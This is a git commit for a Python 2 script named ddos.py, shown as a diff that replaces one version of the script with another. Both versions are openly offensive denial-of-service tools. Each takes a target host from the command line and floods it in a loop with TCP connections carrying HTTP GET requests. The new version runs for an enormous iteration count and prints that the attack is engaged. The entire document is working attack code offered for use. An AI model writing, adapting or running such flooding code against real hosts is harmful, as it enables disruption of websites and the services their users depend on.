5f59635ebb3bb8e47813b4ea8417e7b694777a8b
Henrique Bissoli <emp.shad@gmail.com>
2015-12-10 12:46:36 -0200

    Update ddos.py

--- ddos.py
+++ ddos.py
@@ -1,19 +1,24 @@
-#!/usr/bin/python
+# -*- coding: utf-8 -*-
+import time, socket, os, sys, string
 
-import socket, threading, sys
 if len(sys.argv)>1:
-	print "DDoS: "+sys.argv[1];
-	def attack():
-		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
-		s.connect((sys.argv[1], 80));
-		s.send("GET / HTTP/1.1\r\n");
-		s.send("Host: "+sys.argv[1]+"\r\n\r\n");
-		s.close();
-		sys.stdout.write(".");
-		sys.stdout.flush();
-		attack();
-	threads		= 50 if len(sys.argv)<3 else str(sys.argv[2]);
-	for i in range(0, int(threads)):
-		attack();
+	host=sys.argv[1]
+	port=sys.argv[2]
+	message="Flood"
+	ip = socket.gethostbyname(host)
+	def dos():
+	    ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	    try:
+	        ddos.connect((host, 80))
+	        ddos.send( "GET /%s HTTP/1.1\r\n" % message )
+	        ddos.sendto( "GET /%s HTTP/1.1\r\n" % message, (ip, port) )
+	        ddos.send( "GET /%s HTTP/1.1\r\n" % message )
+	    except socket.error, msg:
+	        print("|[Connection Failed]         |")
+	    print ( "|[DDoS Attack Engaged]       |")
+	    ddos.close()
+	
+	for i in xrange(999999999999):
+	    dos()
 else:
-	print("Usage:\tpython ddos.py domain.com 50");
+	print("Usage:\tpython ddos.py domain port")
